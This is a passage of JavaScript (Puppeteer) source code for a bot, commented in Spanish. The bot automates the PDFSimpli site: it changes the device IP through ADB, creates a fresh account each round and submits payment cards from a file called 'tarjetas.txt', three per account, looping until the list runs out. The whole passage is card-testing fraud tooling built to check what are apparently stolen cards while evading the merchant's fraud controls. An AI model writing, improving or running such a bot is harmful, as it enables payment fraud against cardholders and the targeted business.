        const ipOk = await this.adbManager.checkAndChangeIP();
        if (!ipOk) {
            await this.log("❌ BOT DETENIDO - No se pudo cambiar la IP");
            return false;
        }

        await this.log("🌐 Cargando PDFSimpli (nueva cuenta)...");
        await this.page.goto("https://pdfsimpli.com", {
            waitUntil: "networkidle2",
            timeout: 60000
        });

        await this.delay(1500);

        await this.uploadPDF();
        await this.clickLetsGetStarted();
        await this.clickConvert();

        await this.clickDownload();

        await this.handleRegistration();

        await this.waitAndClickContinueToPayment();

        this.cardsThisAccount = 0;

        while (this.cardsThisAccount < 3) {
            const tarjeta = this.getNextTarjeta();
            if (!tarjeta) {
                await this.log("⛔ No hay más tarjetas en tarjetas.txt");
                return false;
            }

            const usarRapido = this.cardsThisAccount > 0;
            this.cardsThisAccount++;

            await this.log(
                `💳 Probando tarjeta #${this.cardsThisAccount} en cuenta (modo: ${usarRapido ? "RÁPIDO" : "COMPLETO"})`
            );

            try {
                const ok = await this.procesarTarjeta(tarjeta, usarRapido);

                if (ok) {
                    await this.log("🏁 CUENTA FINALIZADA POR TARJETA VÁLIDA → CREAR NUEVA CUENTA");
                    return true;
                }

            } catch (e) {
                await this.log("⚠️ Error procesando tarjeta: " + e.message);
            }
        }

        await this.log("⛔ Las 3 tarjetas de esta cuenta fueron inválidas — se creará una nueva cuenta.");
        return true;
    }

    async close() {
        if (this.browser) {
            await this.browser.close();
            await this.log("🔚 Navegador cerrado");
        }
    }
}

// =============================================================
// MAIN LOOP — CUENTAS INFINITAS HASTA QUE SE ACABEN LAS TARJETAS
// =============================================================
(async () => {
    const bot = new PDFSimpliBot();
    await bot.loadAllTarjetas();
    await bot.initialize();

    try {
        while (true) {
            const seguir = await bot.executeFlowCuenta();
            if (!seguir) {
                await bot.log("🚫 No hay más tarjetas disponibles — BOT FINALIZADO.");
                break;
            }
        }
    } catch (e) {
        console.error("❌ ERROR GENERAL:", e.message);
    }

    await bot.close();
})();